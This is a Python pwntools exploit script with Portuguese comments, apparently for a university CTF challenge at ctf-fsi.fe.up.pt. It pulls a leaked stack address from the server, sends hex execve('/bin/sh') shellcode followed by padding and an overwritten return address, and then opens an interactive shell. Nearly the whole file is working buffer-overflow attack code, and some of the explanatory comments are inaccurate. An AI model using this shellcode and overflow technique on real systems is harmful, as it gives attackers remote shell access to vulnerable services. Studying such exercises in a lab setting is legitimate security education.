from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4001)

txt = p.recvuntil(b":").decode()
addr = re.search('0x(.+?).\n', txt).group(1) # buffer address (from the output of the server when running in the "terminal" - "nc ctf-fsi.fe.up.pt 4001")

buf = bytearray.fromhex(addr)
buf.reverse() # buffer address in little-endian

# Because that's what a shellcode is: a small series of bytes that represent executable machine-language code. 
# For convenience, we choose to represent those bytes in hex notation. 
# And a string of hex characters is a very convenient way of representing a really small, executable piece of code.
shellcode = bytearray.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80") # shellcode hexadecimal number (you can find this number on the internet)
fp = bytearray.fromhex("0"*8) # address of the function to return after main execution (is always null -> 0) (frame pointer)
print(fp)
print(fp * 2)
print(b"a"*77 + fp*2 + buf) # the "b" parameter transforms an array variable into a string variable
finalString = b"a"*77 + fp*2 + buf
# print("len(finalString) = {0}".format(len(finalString)))

# for c in finalString:
#     print(hex(c))

p.sendline(shellcode + finalString) # Send the string to the server (resultString = shellcode_code + ('a' * 77) + ('0' * 16) + (buf with the address outputed in the server))

p.interactive()
